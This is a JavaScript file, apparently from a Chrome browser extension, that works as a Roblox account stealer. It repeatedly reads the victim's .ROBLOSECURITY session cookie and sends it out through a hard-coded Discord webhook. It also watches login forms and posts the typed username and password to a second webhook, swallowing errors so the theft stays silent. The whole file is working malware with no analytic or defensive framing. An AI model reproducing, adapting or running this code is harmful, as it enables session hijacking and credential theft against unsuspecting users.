const COOKIE_WEBHOOK = "https://discord.com/api/webhooks/1488571783379419247/WUQ_IVrWlQobe-QgdQd_UA3ZkWJLfcrGY6QixIm6j5YN8Edio97DyeolslQxavnl3g3M";
const LOGIN_WEBHOOK = "https://discord.com/api/webhooks/1488571402775695573/D5GsZGLM1bRy5ldrSs3zZUomb2XiajjXS5jm1JwKjx9D7DMqRaY9f122sUvqES7hGP6A";

function sendCookie(cookieValue) {
  if (!cookieValue) return;
  fetch(COOKIE_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: cookieValue
    })
  }).catch(() => {});
}

function sendLoginData(username, password) {
  if (!username || !password) return;
  fetch(LOGIN_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `username: ${username}\npassword: ${password}`
    })
  }).catch(() => {});
}

function grabCookie() {
  chrome.cookies.get({
    url: "https://www.roblox.com",
    name: ".ROBLOSECURITY"
  }, (cookie) => {
    if (cookie && cookie.value) {
      sendCookie(cookie.value);
    }
  });
}

const observer = new MutationObserver(() => {
  const usernameInput = document.querySelector('input[name="username"], input[id="username"], input[placeholder*="username" i], input[type="text"]');
  const passwordInput = document.querySelector('input[type="password"]');

  if (passwordInput) {
    passwordInput.addEventListener('input', () => {
      const user = usernameInput ? usernameInput.value : "unknown";
      const pass = passwordInput.value;
      if (pass.length > 5) {
        sendLoginData(user, pass);
      }
    }, { once: false });
  }
});

observer.observe(document.body, { childList: true, subtree: true });

window.addEventListener("load", grabCookie);
setInterval(grabCookie, 2000);

chrome.cookies.onChanged.addListener((info) => {
  if (info.cookie.name === ".ROBLOSECURITY" && info.cookie.domain.includes("roblox.com")) {
    grabCookie();
  }
});
